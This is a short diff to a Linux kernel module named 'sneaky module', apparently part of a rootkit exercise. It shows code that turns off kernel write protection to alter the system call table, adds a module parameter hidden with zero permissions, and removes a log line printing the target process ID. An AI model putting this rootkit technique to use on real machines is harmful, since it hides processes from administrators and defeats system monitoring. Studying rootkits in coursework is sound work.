@@ -28,7 +28,9 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yuefan Yu");
 static int pid = 0;
+static char *pid_s = "";
 module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+module_param(pid_s, charp, 0000);
 // This is a pointer to the system call table in memory
 // Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 // We're getting its adddress from the System.map file (see above).
@@ -51,7 +53,6 @@ static int initialize_sneaky_module(void) {
   struct page *page_ptr;
   // See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
-  printk(KERN_INFO "pid is: %d", pid);
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
   // Get a pointer to the virtual page containing the address
